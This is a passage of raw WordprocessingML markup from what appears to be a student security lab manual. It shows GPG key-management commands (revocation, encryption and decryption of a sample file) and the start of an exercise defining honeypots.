          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:hyperlink r:id="rId41">
        <w:r>
          <w:rPr>
            <w:spacing w:val="2"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>j</w:t>
        </w:r>
        <w:r>
          <w:t>n</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="1"/>
          </w:rPr>
          <w:t>@</w:t>
        </w:r>
        <w:r>
          <w:t>ra</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>j</w:t>
        </w:r>
        <w:r>
          <w:t>a</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="1"/>
          </w:rPr>
          <w:t>l</w:t>
        </w:r>
        <w:r>
          <w:t>aksh</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>mi</w:t>
        </w:r>
        <w:r>
          <w:t>.edu</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="2"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>i</w:t>
        </w:r>
        <w:r>
          <w:t>n</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>Co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>mm</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Message</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-25"/>
        </w:rPr>
        <w:t>Y</w:t>
      </w:r>
      <w:r>
        <w:t>ou se</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s US</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>R-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:t>D:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:t>"B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>ned</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(Me</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>sage)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>&lt;bened</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:hyperlink r:id="rId42">
        <w:r>
          <w:t>.</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>j</w:t>
        </w:r>
        <w:r>
          <w:t>n</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="1"/>
          </w:rPr>
          <w:t>@</w:t>
        </w:r>
        <w:r>
          <w:t>ra</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>j</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="1"/>
          </w:rPr>
          <w:t>a</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>l</w:t>
        </w:r>
        <w:r>
          <w:t>aksh</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>mi</w:t>
        </w:r>
        <w:r>
          <w:t>.edu</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="2"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>i</w:t>
        </w:r>
        <w:r>
          <w:t>n&gt;"</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="3344"/>
      </w:pPr>
      <w:r>
        <w:t>Ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>nge (N)a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(C)o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>mm</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>, (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:t>O)kay</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>(Q)u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">? O </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-25"/>
        </w:rPr>
        <w:t>Y</w:t>
      </w:r>
      <w:r>
        <w:t>ou need</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a Pa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>sphrase</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o pro</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>your secret</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ke</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="1964"/>
      </w:pPr>
      <w:hyperlink r:id="rId43">
        <w:r>
          <w:t>[roo</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="1"/>
          </w:rPr>
          <w:t>@</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>l</w:t>
        </w:r>
        <w:r>
          <w:t>oca</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>l</w:t>
        </w:r>
        <w:r>
          <w:t>host</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>~]# gpg --gen-revoke bene</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:hyperlink r:id="rId44">
        <w:r>
          <w:rPr>
            <w:spacing w:val="2"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>j</w:t>
        </w:r>
        <w:r>
          <w:t>n</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="1"/>
          </w:rPr>
          <w:t>@</w:t>
        </w:r>
        <w:r>
          <w:t>ra</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>j</w:t>
        </w:r>
        <w:r>
          <w:t>a</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="1"/>
          </w:rPr>
          <w:t>l</w:t>
        </w:r>
        <w:r>
          <w:t>aksh</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>mi</w:t>
        </w:r>
        <w:r>
          <w:t>.edu</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="2"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>i</w:t>
        </w:r>
        <w:r>
          <w:t>n</w:t>
        </w:r>
      </w:hyperlink>
      <w:hyperlink r:id="rId45">
        <w:r>
          <w:t xml:space="preserve"> [roo</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="1"/>
          </w:rPr>
          <w:t>@</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>l</w:t>
        </w:r>
        <w:r>
          <w:t>oca</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>l</w:t>
        </w:r>
        <w:r>
          <w:t>host</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>~]# gpg -r bened</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:hyperlink r:id="rId46">
        <w:r>
          <w:t>.</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>j</w:t>
        </w:r>
        <w:r>
          <w:t>n</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="1"/>
          </w:rPr>
          <w:t>@</w:t>
        </w:r>
        <w:r>
          <w:t>ra</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>j</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="1"/>
          </w:rPr>
          <w:t>a</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>l</w:t>
        </w:r>
        <w:r>
          <w:t>aksh</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>mi</w:t>
        </w:r>
        <w:r>
          <w:t>.edu</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="2"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>i</w:t>
        </w:r>
        <w:r>
          <w:t>n</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>opSec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:hyperlink r:id="rId47">
        <w:r>
          <w:t xml:space="preserve"> [roo</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="1"/>
          </w:rPr>
          <w:t>@</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>l</w:t>
        </w:r>
        <w:r>
          <w:t>oca</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>l</w:t>
        </w:r>
        <w:r>
          <w:t>host</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">~]# gpg -o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>opSecre</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>xt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">-d </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>opSecre</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>.gpg</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492" w:right="1375" w:hanging="3392"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Ex. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">o.: 13a                                                                                                         </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="54"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ate: ST</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>U</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DY</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-7"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>HO</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>NEY</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>PO</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TS</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02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20" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:num="2" w:space="720" w:equalWidth="0">
            <w:col w:w="620" w:space="190"/>
            <w:col w:w="8930"/>
          </w:cols>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-17"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>o s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve">udy </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>concept</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>of honeypo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve">s and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ypes.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="12" w:line="240" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="29"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-3"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>sc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>pt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>on:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="100" w:right="73" w:firstLine="710"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A  honeypot </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="15"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="14"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>dece</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">rap, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="14"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>des</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">gned </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
